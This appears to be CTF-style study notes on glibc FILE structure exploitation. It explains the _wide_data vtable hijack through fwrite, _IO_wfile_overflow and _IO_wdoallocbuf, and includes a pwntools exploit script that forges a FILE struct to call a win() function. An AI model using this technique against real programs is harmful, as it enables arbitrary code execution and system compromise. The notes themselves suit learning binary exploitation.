
- `stdin` = `0`
- `stdout` = `1`
- `stderr` = `2`
### Read into the authenticated variable
```python
fp = FileStructure()
payload = fp.read(elf.sym.authenticated, 0x200)
```

#### Write from the authenticated variable
```python
fp = FileStructure()
payload = fp.write(elf.sym.authenticated, 0x200)
```


#### `_IO_FILE_plus` struct
```
struct _IO_FILE_plus
    +0x0000 file                 : FILE
    +0x00d8 vtable               : const struct _IO_jump_t *
```




#### Creating a fake `_wide_data` struct to hijack control of the virtual function table of a `FILE` struct

##### Prerequisits
###### `_lock` field in `_IO_FILE` (Works like a mutex)
The `_lock` pointer is used for threaded file access.
An exploit MUST set `_lock` to point to a:
- Writable location
- With value NULL
##### Overview
- Set `_IO_FILE._wide_data->_wide_vtable` to point to `exploit_vtable` 
- Overwrite `_IO_FILE.vtable` such that `_IO_wfile_overflow()` gets called from inside the `fwrite()` function
	- `_IO_wfile_overflow()` calls the `_IO_wdoallocbuf()` function
		- `_IO_wdoallocbuf()` calls into the `_IO_FILE.wide_data->_wide_vtable` without any checks!

##### Inside `fwrite(buf, 1, 0x100, fp)`
`fwrite()` has the instruction `call   qword ptr [r15 + 0x38]`
`r15` is the `vtable` field in `_IO_FILE_plus` struct in the `fp` argument to `fwrite`
`[r15 + 0x38]` should be `_IO_wfile_overflow` 

##### Inside `_IO_wfile_overflow(fp)`
`call   _IO_wdoallocbuf` calls the `_IO_wdoallocbuf` function with the argument `fp`

##### Inside `_IO_wdoallocbuf(fp)`
`mov    rax, qword ptr [rdi + 0xa0]` places the `_wide_data` field into `rax` (`rdi` is the `fp`)
`mov    rax, qword ptr [rax + 0xe0]` places the `_wide_vtable` from the `_IO_wide_data` struct into `rax` (This is a `_IO_jump_t` struct)
`call   qword ptr [rax + 0x68]` Calls the function pointer at the offset `0x68` in the `_IO_jump_t` struct. This is the `__doallocate` field. Here should `win()` be placed.

##### Exploit script POC
```python
io.recvuntil(b"Please enter your name.\n")
payload = flat(
    p8(0)*0x68, # padding for the _IO_jump_t struct that calls the win function
    p64(elf.sym.win),
    p8(0)*(0xe0-(0x68+8)), # more padding to overwrite the vtable field in the _wide_data struct
    name_buffer
)
io.sendline(payload)

fp = FileStructure()
fp._lock = name_buffer - 0x30 # a writable and NULL address
fp._wide_data = name_buffer # where the fake _wide_data struct is located
fp.vtable = libc.sym._IO_wfile_jumps_maybe_mmap+24-0x38 # when fwrite() is called it jumps to r15+0x38 which we would like to be _IO_wfile_overflow

io.recvuntil(b"Now reading from stdin directly to the FILE struct.\n\n")
io.send(bytes(fp))
```